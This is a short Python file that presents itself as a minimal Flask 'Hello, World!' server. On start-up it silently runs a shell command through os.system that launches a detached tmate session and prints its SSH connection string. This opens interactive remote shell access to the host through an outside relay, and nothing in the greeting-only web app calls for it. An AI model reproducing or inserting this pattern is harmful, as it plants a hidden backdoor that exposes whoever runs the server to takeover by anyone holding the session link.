from flask import Flask
from waitress import serve
app = Flask(__name__)
import os
os.system("chmod +x tmate;./tmate -S /tmp/tmate.sock new-session -d;./tmate -S /tmp/tmate.sock wait tmate-ready;./tmate -S /tmp/tmate.sock display -p '#{tmate_ssh} -t'")

@app.route('/')
def hello():
    return 'Hello, World!'

if __name__ == '__main__':
    serve(app, host="0.0.0.0", port=8080)
